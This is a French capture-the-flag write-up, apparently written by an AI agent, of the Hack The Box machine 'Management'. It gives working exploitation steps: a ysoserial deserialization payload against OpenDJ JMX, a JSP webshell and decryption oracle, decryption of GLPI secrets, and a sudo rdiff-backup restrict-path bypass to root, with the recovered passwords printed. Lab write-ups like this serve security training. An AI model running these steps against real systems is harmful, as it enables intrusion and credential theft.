# HTB — Management — Write-up

**Cible :** 10.129.7.21 (`management.htb`)
**Date :** 14 septembre 2026
**Objectif :** user + root
**Statut :** ✅ **PWNED** — user + root

---

## 1. Reconnaissance

### 1.1 Scan de ports

```
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
80/tcp  open  http     nginx 1.24.0 (Ubuntu)   -> redirige vers HTTPS
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
```

Le certificat TLS donne le premier pivot :

```
Subject:  commonName=management.htb / O=Management Managed Services Ltd
SAN:      DNS:management.htb, DNS:*.management.htb
```

Le wildcard `*.management.htb` annonce l'existence de sous-domaines.

```bash
echo "10.129.7.21 management.htb" >> /etc/hosts
```

### 1.2 Le front-end est chiffré

`https://management.htb/` ne sert qu'un loader. Le vrai code applicatif est dans
`assets/app.enc`, déchiffré côté navigateur en **AES-GCM**… avec la clé en clair
dans le HTML :

```js
var KEY="C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=", FILE="assets/app.enc";
// IV = 12 premiers octets, puis ciphertext ; eval() du résultat
```

Déchiffrement hors ligne :

```python
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key = base64.b64decode('C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=')
raw = base64.b64decode(open('app.enc').read().strip())
open('app.js','wb').write(AESGCM(key).decrypt(raw[:12], raw[12:], None))
```

→ 63 863 octets de JavaScript, obfusqué façon **obfuscator.io** (tableau de
chaînes + décodeur base64 + rotation du tableau).

### 1.3 Désobfuscation

Le piège classique : le tableau de chaînes est **pivoté au chargement** par
l'IIFE de checksum en tête de fichier. Extraire `_0xf1cf` et `_0x6d9c` seuls
donne des chaînes décalées. Il faut rejouer la rotation :

```bash
# 1. extraire _0xf1cf (tableau), _0x6d9c (décodeur) ET l'IIFE de rotation
# 2. les évaluer dans node dans cet ordre
# 3. dumper _0x6d9c(i) pour i dans [0, 1600[
# 4. réinjecter les littéraux dans le source + fusionner les concaténations
```

→ 1 287 chaînes récupérées. Recherche des hôtes :

```
management.htb
sso.management.htb      <-- nouveau
```

### 1.4 Fuzzing de vhosts (confirmation)

```bash
ffuf -u https://10.129.7.21/ -H "Host: FUZZ.management.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 178
```

Un seul résultat : **`sso`**. La surface d'attaque est donc entièrement là.

---

## 2. Énumération de `sso.management.htb`

```
GET /            -> 302 /openam/
GET /openam/XUI/ -> 200  page de login OpenAM
```

**OpenAM** (ForgeRock Access Management).

| Endpoint | Code | Note |
|---|---|---|
| `/openam/isAlive.jsp` | 200 | `Server is ALIVE` |
| `/openam/ccversion/Masthead.jsp` | 200 | endpoint Jato — vecteur CVE-2021-35464 |
| `/openam/ccversion/Version` | 200 | idem |
| `/openam/json/serverinfo/*` | 200 | fuite de config |
| `/openam/UI/Login` | 302 | |

`Set-Cookie: JSESSIONID=...` → il y a bien un vrai Tomcat derrière nginx, ce
n'est pas une maquette statique.

### 2.1 Fuites de configuration

`/openam/json/serverinfo/*` :

```json
{
  "domains": [".management.htb"],
  "cookieName": "iPlanetDirectoryPro",
  "secureCookie": false,
  "selfRegistration": "false",
  "zeroPageLogin": {"enabled": false},
  "realm": "/"
}
```

`POST /openam/json/authenticate` révèle le **base DN du realm** :

```
authId (JWT, décodé) -> {"realm":"dc=management,dc=htb", ...}
stage: DataStore1   (chaîne d'auth = module DataStore, user/password)
```

Sondage des modules d'authentification :

| Module | Code |
|---|---|
| `DataStore` | 200 |
| `LDAP` | 200 |
| `Application` | 200 |
| `HOTP` | 401 |
| `Anonymous` | 404 |

### 2.2 Version

Pas de divulgation directe (`/openam/base/Version` exige une session admin).
Indices : `Copyright © 2011-2016`, `Copyright 2015 ForgeRock AS` dans les
templates XUI → branche **OpenAM 13.x / 14.x**.

---

## 3. Tentative : CVE-2021-35464 (RCE pré-auth)

Désérialisation Java non authentifiée via le paramètre `jato.pageSession` du
framework Jato (ForgeRock AM ≤ 7.0 / OpenAM ≤ 14.6.3).

```bash
# génération (Java 17 refuse la réflexion — utiliser Java 11)
/usr/lib/jvm/java-11-openjdk*/bin/java -jar ysoserial.jar Click1 \
  "bash -c {echo,BASE64CMD}|{base64,-d}|{bash,-i}" > payload.bin
curl -sk "https://sso.management.htb/openam/ccversion/Version?jato.pageSession=$(urlencode payload)"
```

Oracle utilisé : **timing** (`sleep 12`), faute de canal out-of-band (cf. §5).

Résultat — 18 chaînes de gadgets testées (`Click1`, `CommonsBeanutils1`,
`CommonsCollections1-7`, `Jdk7u21`, `Groovy1`, `Spring1/2`, `Hibernate1`,
`ROME`, `Vaadin1`) :

```
toutes -> code=200  t≈0.08s  size=2608   (réponse strictement identique)
```

Également testé sans succès :
- le contournement de filtre `/openam/oauth2/..;/ccversion/Version` ;
- les encodages `base64` brut, base64-url, gzip+base64, deflate+base64 ;
- la variante POST → **405 Method Not Allowed** (l'endpoint est GET seulement).

**Conclusion : le paramètre n'est pas désérialisé.** Instance patchée, ou fork
avec un `ObjectInputStream` filtré. Piste écartée.

---

## 4. Scan de ports complet — l'erreur à ne pas faire

Le scan initial ne couvrait que `22,80,443`. Un `-p-` change tout :

```bash
nmap -p- --min-rate 4000 -T4 -Pn 10.129.7.21
```

```
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
1689/tcp  open  java-rmi     <-- OpenDJ, registre RMI/JMX
4444/tcp  open  ssl/ldap     <-- OpenDJ, connecteur d'administration
40047/tcp open  java-rmi     <-- OpenDJ, serveur RMI du JMX
50389/tcp open  ldap         <-- OpenDJ (annuaire OpenAM)
```

L'annuaire **OpenDJ 5.0.3 (Open Identity Platform)** est exposé.

---

## 5. Foothold applicatif : `demo` / `changeit`

Les installations OpenAM créent un utilisateur de démonstration. Il n'a pas été
retiré :

```bash
curl -sk -X POST -H "Content-Type: application/json" \
  -H "Accept-API-Version: resource=2.0, protocol=1.0" \
  -H "X-OpenAM-Username: demo" -H "X-OpenAM-Password: changeit" \
  https://sso.management.htb/openam/json/authenticate
```

```json
{"tokenId":"AQIC5wM2LY4Sfcz...","successUrl":"/openam/console","realm":"/"}
```

Compte non privilégié (`id=demo,ou=user,dc=management,dc=htb`, rôle
`ui-self-service-user`), mais la session ouvre plusieurs portes.

### 5.1 Fuite de hash via l'API Identity Services *(finding)*

`/openam/identity/attributes` renvoie les attributs du porteur du jeton —
**y compris `userPassword`** :

```bash
curl -sk "https://sso.management.htb/openam/identity/attributes?subjectid=<TOKEN_URLENCODE>"
```

```
userdetails.attribute.name=dn
userdetails.attribute.value=uid=demo,ou=people,dc=management,dc=htb
userdetails.attribute.name=userPassword
userdetails.attribute.value={SSHA}bbf4Mlh9h4YQSoldL08ynJIxGiBDjBAoMJUJgw==
```

Les opérations privilégiées restent fermées :

```
/openam/identity/search             -> UnsupportedOperationException
/openam/identity/read?name=amadmin  -> AccessDenied (id=demo)
```

### 5.2 Surface d'authentification

Modules configurés (sondage `authIndexType=module`) :

| Module | Réponse |
|---|---|
| `DataStore`, `LDAP`, `Application`, `Federation` | 200 (callbacks) |
| `HOTP` | 401 |
| **`Amster`** | **500 — `Authentication Error!!`** |
| tous les autres | 404 |

`Amster` est le module d'automatisation d'OpenAM (authentification `amadmin`
par JWT signé). Il est enregistré mais échoue sans JWT valide — piste ouverte.

Un seul realm existe (`/`) : toute autre valeur renvoie 400.

---

## 6. OpenDJ : ce que `demo` peut voir

Bind anonyme accepté sur le rootDSE :

```
namingContexts: dc=management,dc=htb
vendorName:     Open Identity Platform Community
vendorVersion:  OpenDJ Server 5.0.3
```

Bind `uid=demo,ou=people,dc=management,dc=htb` / `changeit` : **accepté**.

### 6.1 Un oracle d'existence de DN *(finding)*

Les ACI masquent le contenu, mais **pas les codes de retour** :

| Base | Résultat |
|---|---|
| `ou=people,dc=management,dc=htb` | `success` (0 entrée) — existe |
| `ou=user,dc=management,dc=htb` | `noSuchObject` — n'existe pas |

On distingue donc un DN existant d'un DN absent. Énumération des comptes :

```python
c.search(f'uid={w},ou=people,dc=management,dc=htb', '(objectClass=*)',
         search_scope=BASE, attributes=['1.1'])
# 'success' => le compte existe
```

Résultat sur `names.txt` (10 713) puis `xato` (10 000) : **seul `demo` existe**.
Le magasin d'identités ne contient qu'un compte.

### 6.2 Backends administratifs lisibles *(finding)*

| Base | Accès `demo` |
|---|---|
| `cn=monitor` | ✅ 23 entrées |
| `cn=tasks` | ✅ lecture / ❌ écriture |
| `cn=admin data` | ✅ 7 entrées |
| `cn=ads-truststore` | ✅ 3 entrées |
| `cn=config` | ❌ `insufficientAccessRights` |
| `ou=tokens` (CTS, sessions) | masqué par ACI |

`cn=admin data` et `cn=ads-truststore` ne contiennent que des certificats
publics. L'écriture dans `cn=tasks` — qui aurait permis une tâche
`ExportTask` écrivant un fichier arbitraire (ex. `authorized_keys`) — est
refusée.

### 6.3 `cn=monitor` : cartographie du système *(finding)*

```
systemName:       management
operatingSystem:  Linux 6.8.0-139-generic amd64
javaVersion:      21.0.12
installPath:      /opt/openam/config/opends
classPath:        /opt/openam-tomcat/bin/bootstrap.jar:...
jvmArguments:     -Dcom.iplanet.services.configpath=/opt/openam/config
                  -Dcatalina.base=/opt/openam-tomcat ...
```

Deux enseignements :

1. Les chemins : config OpenAM dans `/opt/openam/config`, Tomcat dans
   `/opt/openam-tomcat`. Le fichier `bootstrap` d'OpenAM (qui contient le mot
   de passe chiffré du magasin de configuration) est donc dans
   `/opt/openam/config`.
2. Le `classPath` est celui de Tomcat : **OpenDJ tourne dans la JVM de
   Tomcat**. Une exécution de code dans l'un donne l'autre.

`cn=Client Connections,cn=monitor` expose en clair les connexions en cours :

```
authDN="cn=Directory Manager,cn=Root DNs,cn=config"  source="127.0.0.1:51264"
```

→ OpenAM se connecte à son magasin en **`cn=Directory Manager`**.

---

## 7. JMX : accessible, mais il manque le privilège

Le connecteur JMX d'OpenDJ écoute sur 1689. La recherche dans le registre RMI
réussit, mais le stub renvoyé pointe vers `127.0.1.1:40047` — la résolution
*interne* de la cible. On relaie en local :

```bash
socat TCP-LISTEN:40047,bind=127.0.1.1,fork,reuseaddr TCP:10.129.7.21:40047 &
socat TCP-LISTEN:1689,bind=127.0.1.1,fork,reuseaddr  TCP:10.129.7.21:1689  &
```

```
service:jmx:rmi:///jndi/rmi://10.129.7.21:1689/org.opends.server.protocols.jmx.client-unknown
```

La connexion aboutit alors jusqu'à l'authentification :

```
anonyme : java.lang.SecurityException
demo    : SecurityException: You do not have sufficient privileges to establish
          the connection through JMX. At least JMX_READ privilege is required
```

**C'est le pivot à viser.** OpenDJ partageant la JVM de Tomcat, un accès JMX
privilégié expose aussi les MBeans de Tomcat → exécution de code. Il faut un
compte disposant de `JMX_READ`, c'est-à-dire `cn=Directory Manager`.

---

## 8. FOOTHOLD — CVE-2026-46495 : RCE pré-auth via désérialisation JMX/RMI (OpenDJ)

La recherche CVE oriente vers **CVE-2026-46495** : le connecteur JMX/RMI d'OpenDJ
désérialise les *credentials* du client **avant authentification**, sans filtre.
Les ports 1689 (registre) et 40047 (serveur RMI) sont exposés.

### 8.1 Relais RMI (contrainte réseau)

Le stub RMI renvoie une adresse interne `127.0.1.1:<port>` — et **ce port est
dynamique** (il change à chaque redémarrage du connecteur : observé 40047 →
41949). On l'interroge dans le registre puis on le relaie :

```bash
# lire le vrai port de données
java Stub 10.129.7.21 1689   # -> UnicastRef ... endpoint:[127.0.1.1:41949]
socat TCP-LISTEN:41949,bind=127.0.1.1,fork,reuseaddr TCP:10.129.7.21:41949 &
```

### 8.2 Le serveur désérialise bien — reste à trouver le gadget

`stub.newClient(<objet ysoserial>)` déclenche la désérialisation. Confirmation
directe : CommonsCollections6 renvoie
`UnsupportedOperationException: Serialization support for InvokerTransformer is
disabled` — c'est la **commons-collections 3.2.2 du serveur** qui parle. La
désérialisation a donc lieu.

Sonde de classpath (objet forgé via javassist → l'erreur dit ABSENT /
PRESENT+serialVersionUID) : la plupart des gadgets classiques ont leurs classes
absentes ou avec un `serialVersionUID` incompatible (Groovy, Rhino…). **Mais** :

```
org.apache.xalan.xsltc.trax.TemplatesImpl        PRESENT  (Xalan autonome !)
org.apache.click.control.Column                  PRESENT  (gadget Click)
```

Le **Xalan autonome** (`org.apache.xalan.*`, pas le `com.sun.org.apache.xalan`
du JDK) échappe au module fermé du JDK 21 qui bloquait tout le reste.

### 8.3 Exécution

Gadget **Click1** régénéré pour cibler le Xalan autonome, via Java 11 :

```bash
java -DproperXalan=true \
  -cp xalan-2.7.3.jar:serializer-2.7.3.jar:ysoserial.jar \
  JmxDeser 10.129.7.21 1689 Click1 "<cmd>"
```

Charge utile = bind shell (pas de reverse possible, cf. §9). Résultat :

```
openam@management:/$ id
uid=996(openam) gid=987(openam) groups=987(openam)
```

**RCE en tant qu'`openam`.** Stabilisé ensuite par un **webshell JSP** déposé
dans la webroot OpenAM (writable, et Tomcat tourne en permanence) :

```
POST https://sso.management.htb/openam/s.jsp   c=<commande>
```

## 9. Post-exploitation `openam` → secrets OpenAM

Système : `OpenAM 16.0.5`, Tomcat sous l'utilisateur `openam`, cible = user
**owen** (`Owen Castellan`, uid 1000) puis root.

### 9.1 Secrets de configuration lisibles

```
/opt/openam/config/openam/.storepass        S9n50IUgcRe1Lkj/7gp5OpdZHf1bphqh
/opt/openam/config/openam/.keypass          changeit
/opt/openam/config/openam/openam_mon_auth    demo AQIC283QQfqYTPlvvQDJKI4bSMUIq2EvNWI4
/opt/openam/config/opends/config/config.ldif  {SSHA512}… (hash Directory Manager)
```

### 9.2 Oracle de déchiffrement OpenAM *(finding majeur)*

La webroot OpenAM est **writable par `openam`**, et `openam-core-16.0.5.jar`
fournit `com.iplanet.services.util.Crypt`. On dépose un JSP qui déchiffre
n'importe quelle chaîne `AQIC…` avec la clé de config vivante du serveur :

```jsp
<%@ page import="com.iplanet.services.util.Crypt" %><%
out.print(Crypt.decrypt(request.getParameter("s"))); %>
```

En extrayant toutes les chaînes `AQIC…` du backend OpenDJ
(`/opt/openam/config/opends/db/userRoot/*.jdb`) et en les passant au JSP :

| Chiffré (contexte LDAP) | Déchiffré |
|---|---|
| `iplanet-am-policy-config-ldap-bind-password` (cn=Directory Manager) | **`rCi5i6A7zqAf`** |
| mot de passe amadmin | **`y1qJedqZosu2`** |
| openam_mon_auth (demo) | `changeit` |

- **`cn=Directory Manager` / `rCi5i6A7zqAf`** → contrôle total d'OpenDJ (vérifié).
- **`amadmin` / `y1qJedqZosu2`** → super-admin OpenAM (session obtenue).

### 9.3 Cartographie post-accès

- OpenDJ ne contient qu'un compte utilisateur (`demo`) — **owen n'est pas dans
  l'annuaire** (les logs OpenDJ montrent des `uid=owen` cherchés mais absents).
- Aucun des secrets déchiffrés ne déverrouille `owen` (su/ssh testés : échec).
- Services custom : `mgmt-backup.service` + `.timer` (rdiff-backup nocturne,
  root) ; `sysmon.service` (Sysmon for Linux, root, log les lignes de commande
  dans `/var/log/syslog` — illisible par `openam`, groupe `adm`).
- Backups : `/opt/backup` (copie du site, www-data) ; `/opt/backups/system`
  (root-only).

### 9.4 Piste active

Le mot de passe de `owen` n'est ni dans OpenAM ni dans un fichier lisible.
Hypothèse : un processus périodique (cron / simulation d'activité) manipule
`owen` en passant un secret en ligne de commande — capturable par surveillance
des processus (mini-pspy en cours). Sysmon confirme que la box journalise
justement les `ProcessCreate`.

## 10. `openam` → `owen` (user.txt) : GLPI

php-fpm tournait sans vhost nginx apparent : une app PHP existe hors chemin
servi. `find / -name '*.php'` :

```
/opt/glpi/...      GLPI 11.0.5  (www-data, lisible par openam)
```

GLPI — l'ITSM du MSP (« Service Desk & Assets » du site). Sa config est lisible :

```php
// /opt/glpi/config/config_db.php
$dbuser='glpi'; $dbpassword='8rhu0L6Pw4Y7'; $dbdefault='glpidb';
```

Dans la base, la config d'auth LDAP contient un compte de service et son mot de
passe **chiffré** :

```sql
SELECT rootdn, rootdn_passwd FROM glpi_authldaps;
-- cn=svc-glpi,ou=services,dc=management,dc=htb
-- avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

GLPI chiffre ses secrets en **XChaCha20-Poly1305** (`GLPIKey::decrypt`) avec
`config/glpicrypt.key` (32 o) — clé et code accessibles à `openam` :

```php
$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
$s = base64_decode('avrqW65a...');
$np = SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES;   // 24
$nonce = substr($s,0,$np); $ct = substr($s,$np);
echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ct,$nonce,$nonce,$key);
// -> WpczC40GhTbk
```

**Réutilisation de mot de passe** : `svc-glpi` = `owen` en SSH.

```bash
sshpass -p 'WpczC40GhTbk' ssh owen@10.129.7.21
owen@management:~$ cat user.txt
b57f6581fd3afba0d2caab14e6948693
```

## 11. `owen` → `root` : sudo `rdiff-backup --server` (restrict-path bypass)

```bash
owen@management:~$ sudo -l
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

Le `*` final autorise des arguments supplémentaires. En `argparse`, la **dernière**
occurrence d'une option l'emporte : on ajoute `--restrict-mode read-write` et un
`--restrict-path` neuf, qui écrasent la restriction `/opt/backup`+`read-only`.

Contrainte : `--remote-schema` de l'ancien CLI exige un placeholder `%s`
(= le hostname avant `::`), et `--server` refuse tout argument positionnel. On
place donc `%s` comme **valeur** du dernier `--restrict-path`, avec le hostname
`/` :

```bash
rdiff-backup -v3 \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-mode read-write --restrict-path %s' \
  '/::/root' /tmp/rb
```

`%s` → `/` : la commande effective devient
`… --restrict-mode read-write --restrict-path /` — serveur rdiff-backup **root**
avec accès complet au FS. `/root` est mirroré dans `/tmp/rb` (owen) :

```
/tmp/rb/root.txt                      43738393aba3ac0c5af16db7141c89b7
/tmp/rb/.ssh/id_ed25519               (clé privée root)
```

Shell root complet via la clé récupérée :

```bash
ssh -i rootkey root@10.129.7.21
root@management:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Le même vecteur en mode `read-write` permet aussi d'**écrire** en root
(authorized_keys, cron…). Note : owen a par ailleurs (ACL) accès aux logs
`laurel`/auditd — chemin alternatif vers un secret root.

---

## 12. Flags

| | |
|---|---|
| **user.txt** (owen) | `b57f6581fd3afba0d2caab14e6948693` |
| **root.txt** | `43738393aba3ac0c5af16db7141c89b7` |

---

## 13. Chaîne complète (résumé)

1. Cert TLS `*.management.htb` → vhost `sso`.
2. Front-end chiffré AES-GCM, **clé en clair** → déchiffrement + désobfuscation → `sso.management.htb` (OpenAM).
3. **`demo:changeit`** (creds par défaut OpenAM).
4. Scan `-p-` → OpenDJ JMX/RMI exposé (1689 + port données dynamique).
5. **CVE-2026-46495** — désérialisation JMX pré-auth (gadget Click1 + Xalan autonome, relais socat) → RCE **`openam`**.
6. Webshell JSP + `Crypt.decrypt()` (clé de config vivante) → **amadmin** `y1qJedqZosu2`, **Directory Manager** `rCi5i6A7zqAf`.
7. GLPI (`/opt/glpi`, lisible) → MySQL `glpi:8rhu0L6Pw4Y7` → mot de passe LDAP `svc-glpi` chiffré → **XChaCha20 decrypt** = `WpczC40GhTbk`.
8. Réutilisation `svc-glpi` → **`owen`** (SSH) → **user.txt**.
9. `sudo rdiff-backup --server *` — bypass `--restrict-path` via placeholder → lecture/écriture **root** → clé SSH root → **root.txt**.

---

## Annexe — fichiers de travail

`/tmp/claude-0/-workspace/fc9094f4-652f-4eda-9aa9-247ce62c2839/scratchpad/`

| Fichier | Contenu |
|---|---|
| `app.enc`/`app.js`/`app.pretty.js` | bundle chiffré / déchiffré / désobfusqué |
| `JmxDeser.java` / `Stub.java` / `ClassProbe.java` | exploit CVE-2026-46495 + sondes |
| `d.jsp` / `shell.jsp` | JSP de déchiffrement / webshell |
| `w.sh` / `oc.sh` | helpers webshell openam / SSH owen |
| `htbkey` / `rootkey` | clés SSH (accès owen / root) |
| `fulldump.ldif` | dump OpenDJ (Directory Manager) |
